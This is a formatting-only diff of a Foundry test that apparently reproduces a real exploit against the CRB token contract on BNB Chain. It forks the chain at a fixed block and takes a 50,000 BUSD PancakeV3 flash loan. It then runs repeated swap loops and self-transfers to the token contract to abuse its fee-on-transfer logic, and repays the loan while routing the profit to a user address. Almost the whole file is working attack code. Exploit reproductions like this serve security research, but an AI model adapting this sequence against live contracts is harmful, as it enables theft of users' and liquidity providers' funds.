@@ -14,13 +14,13 @@ import "./../interface.sol";
 // Vulnerable Contract Code : https://bscscan.com/address/0xee6De822159765daf0Fd72d71529d7ab026ec2f2#code
 
 // @Analysis
-// Post-mortem : 
-// Twitter Guy : 
-// Hacking God : 
+// Post-mortem :
+// Twitter Guy :
+// Hacking God :
 pragma solidity ^0.8.0;
 
 contract crb2 is Test {
-    uint256 blocknumToForkFrom = 39651175;
+    uint256 blocknumToForkFrom = 39_651_175;
     address user = 0x65bBA34C11aDd305cB2A1f8A68ceCbd6E75089Cd;
     IERC20 crb_token;
     IERC20 busd;
@@ -28,10 +28,9 @@ contract crb2 is Test {
     Uni_Pair_V3 flashLoan;
     IRouter router;
 
-
     function setUp() public {
         vm.createSelectFork("bsc", blocknumToForkFrom);
-        vm.deal(user, 0.2 ether); 
+        vm.deal(user, 0.2 ether);
 
         router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
         crb_token = IERC20(0xee6De822159765daf0Fd72d71529d7ab026ec2f2);
@@ -42,26 +41,21 @@ contract crb2 is Test {
         busd.approve(address(router), type(uint256).max);
 
         crb_token.approve(address(router), type(uint256).max);
-
-
     }
 
     function testExploit() public {
-        vm.startPrank(user,user);
-        busd.approve(address(router),type(uint256).max);
-        busd.approve(address(this),type(uint256).max);
+        vm.startPrank(user, user);
+        busd.approve(address(router), type(uint256).max);
+        busd.approve(address(this), type(uint256).max);
         crb_token.approve(address(this), type(uint256).max);
         vm.stopPrank();
-        emit log_named_decimal_uint("busd", busd.balanceOf(address(user)), 18); 
+        emit log_named_decimal_uint("busd", busd.balanceOf(address(user)), 18);
 
-        flashLoan.flash(address(this),50000 * 1e18,0,new bytes(1));
-        emit log_named_decimal_uint("busd", busd.balanceOf(address(user)), 18); 
-
-
+        flashLoan.flash(address(this), 50_000 * 1e18, 0, new bytes(1));
+        emit log_named_decimal_uint("busd", busd.balanceOf(address(user)), 18);
     }
 
-     function pancakeV3FlashCallback(uint256 fee0,uint256 fee1,bytes calldata data) public{
-
+    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) public {
         address[] memory buyPath = new address[](2);
         buyPath[0] = address(busd);
         buyPath[1] = address(crb_token);
@@ -71,38 +65,36 @@ contract crb2 is Test {
         sellPath[1] = address(busd);
 
         for (uint256 index = 0; index < 70; index++) {
-            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(busd.balanceOf(address(pair))/10, 0, buyPath, address(this), block.timestamp);
-            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(crb_token.balanceOf(address(this)) , 0, sellPath, address(this), block.timestamp);
-           
+            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+                busd.balanceOf(address(pair)) / 10, 0, buyPath, address(this), block.timestamp
+            );
+            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+                crb_token.balanceOf(address(this)), 0, sellPath, address(this), block.timestamp
+            );
         }
-        busd.transfer(address(crb_token),2000 * 1e18);
-        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(6635861088657488493824, 0, buyPath, address(user), block.timestamp);
+        busd.transfer(address(crb_token), 2000 * 1e18);
+        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            6_635_861_088_657_488_493_824, 0, buyPath, address(user), block.timestamp
+        );
 
         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(1e18, 0, buyPath, address(this), block.timestamp);
-        uint256 amount = crb_token.balanceOf(address(this)) / 10000;
+        uint256 amount = crb_token.balanceOf(address(this)) / 10_000;
         for (uint256 index = 0; index < 100; index++) {
-            crb_token.transfer(address(crb_token),amount);
+            crb_token.transfer(address(crb_token), amount);
         }
-        busd.transfer(address(crb_token),2000 * 1e18);
+        busd.transfer(address(crb_token), 2000 * 1e18);
         for (uint256 index = 0; index < 250; index++) {
-            crb_token.transfer(address(crb_token),amount);
+            crb_token.transfer(address(crb_token), amount);
         }
-        crb_token.transferFrom(user,address(this),crb_token.balanceOf(address(user)) / 2);
-        crb_token.transfer(address(crb_token),crb_token.balanceOf(address(this)) - amount * 10000);
-        busd.transferFrom(user,address(this),busd.balanceOf(address(user)));
+        crb_token.transferFrom(user, address(this), crb_token.balanceOf(address(user)) / 2);
+        crb_token.transfer(address(crb_token), crb_token.balanceOf(address(this)) - amount * 10_000);
+        busd.transferFrom(user, address(this), busd.balanceOf(address(user)));
 
         for (uint256 index = 0; index < 3000; index++) {
-            crb_token.transfer(address(crb_token),amount);
+            crb_token.transfer(address(crb_token), amount);
         }
-        
-        busd.transfer(address(flashLoan),50025*1e18);
-        busd.transfer(user,busd.balanceOf(address(this)));
 
-
+        busd.transfer(address(flashLoan), 50_025 * 1e18);
+        busd.transfer(user, busd.balanceOf(address(this)));
     }
-
-
-   
-
-    
 }
